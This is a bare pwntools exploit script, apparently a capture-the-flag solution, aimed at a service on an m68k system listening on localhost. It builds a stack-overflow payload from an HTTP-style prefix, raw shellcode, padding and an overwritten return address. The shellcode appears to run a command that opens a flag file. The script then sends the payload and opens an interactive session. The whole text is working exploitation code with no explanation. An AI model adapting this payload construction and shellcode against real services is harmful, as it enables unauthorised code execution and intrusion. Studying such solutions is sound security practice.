from pwn import *

context.log_level = 'debug'

context.arch = 'm68k'

# Flag is in /me/flag

# Prefix is "GET /aaa"
prefix_size = 8

payload = "http://example.com/aaa"

shellcode = "\xb7\x83\x2f\x03\x2f\x3c\x6f\x70\x65\x6e\x2f\x3c\x62\x69\x6e\x2f\x2f\x3c\x75\x73\x72\x2f\x2f\x3c\x2f\x2f\x2f\x2f\x22\x0f\x2f\x03\x2f\x3c\x66\x6c\x61\x67\x2f\x3c\x2f\x6d\x65\x2f\x28\x0f\x2f\x03\x2f\x04\x2f\x01\x24\x0f\x70\x3b\x4e\x44"

payload += shellcode

payload += 'a' * (258 - prefix_size - len(shellcode))

payload += 'bcde'

addr = p32(0x03fff786 + prefix_size)

payload += addr

conn = remote("localhost", "42424")

size = len(payload)

conn.send(p32(size))

conn.send(payload)


conn.interactive()
